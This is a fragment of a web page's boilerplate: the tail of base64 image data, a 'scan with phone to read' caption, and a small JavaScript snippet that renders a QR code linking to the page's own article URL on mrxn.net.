fDPOZ4Hyqnq4wa5RD1QFabgFsrxDouAnvX6DzsM/fLTvQvgro3p3hsIDyJa16xXc41Sug+gOtnXiHSeDyHNYN8Um9CK6BvMgg/BjDQHzFEqFfMxfCyFlLdJ/knEPvYV+ifcaZlhz0flC5a43pv+KsCWHsBXsu+zpX7TGsJaZnGEiKK3/8Cdz62JuPBfXKyAnDnpv5k8ta51A9oONRyx5QvuTs/4izDmOPowaYmiKw/SM9E6E0oMnA5oeOfm7hv+aGtO/4/zxZA3mxAbaBQF0hXRsHFJfPfNRg/MWZPULXKndA9YWO1hKhdPeYIZQHOs56mIPRl32hdPsT03eVw3mP7Occyg+s//r97cX+tBvi54I+LU8wEUq/4qA8gNtOcdYDaP/opa4cuuaG4h3mZghVa68QioOOs9oZp/oM6D3Mz+qg+6By+4XDQGZNFve4E1gDedxZ39rp1kCgrhbQmgLtrcUkFOd1IpQGJN1yXVdFIyaJ9GOkzRowPNsdTR73g7GHNSF0HRDVAmj7wz5vpkige24NJGpX+ssn0H79rlfHMbz3kT9b258481qH/sowl34o3RrUGq7R/kSomuScQ2nQP8Lnc9j3EZe6ctcJtVYod2h9jHVDfDpTfDzZfpcF/VUCn8vvPDb0nvbnqwO6DpXbN0PXpmYuMXXlqTkX74DaG67RfiN0v7lEKN17ClN3vm6IT+JFcA3kRQbhx2gD0RX6TLhB4qwe6qqmb5a7dqbNOKi+rhPaB6XB+I80dM1+1R7DmtCa8rOwRzjziFfMtOTaQJJc+fNOYBgI9FcQjPnVo0L506NXxTGsQ/mho7VEKD0551AaYGqHwO6HtBRhrwEptxzYejQiEigNRgzbVg8kNc2HgUxdi3zYCayBPOyo72306wMBtuuaj+O3sM9yrkvMHnC+l2vSP+PgvEfWOnePxDuaPFB7QcdfH4g2XrE/gavVjw7ErxLoE/fm0Dmo3H6hfcodsPfZI4S95hqhdAeUDwqlO6A4e4XWEuHcB6OmPgooDTqKv4ofHcjVRku7dwJrIPfO6WGuYSB5VWf5nSeb1c04GK8yjNydPeWBqs29xGdAeWD8KV516T3m0h3WjmvxM068Asb9xTuGgVhY+JwTaAOBPjn4OL96XOj19kHnoHJrQhg5v9KgNOioGgV0zn7xZ2GPEKr2zGteXoXXQqhaGFH6MVR/DHuSbwOxuPC5J7AG8tzzH3b/HwAAAP//E1kxDwAAAAZJREFUAwDoiwCt4K4pjQAAAABJRU5ErkJggg==)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/api-wxapps-doPageGuiz-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 